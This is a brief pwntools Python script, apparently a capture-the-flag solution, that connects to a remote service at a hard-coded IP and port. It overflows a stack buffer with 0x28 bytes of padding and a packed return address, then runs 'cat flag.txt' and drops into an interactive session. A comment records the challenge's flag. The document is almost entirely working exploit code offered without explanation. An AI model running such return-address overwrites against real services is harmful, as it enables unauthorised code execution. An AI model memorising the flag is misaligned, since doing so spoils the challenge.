from pwn import *

r = remote('140.110.112.218', 2121)

r.recvuntil("Buffer overflow is e4sy")
r.sendline(b'a'*0x28 + p64(0x00400646))
r.recvuntil("!")
r.sendline("cat flag.txt") # AngelboyCTF{YodbgBUFJp6ypXRqkKjI}
r.interactive()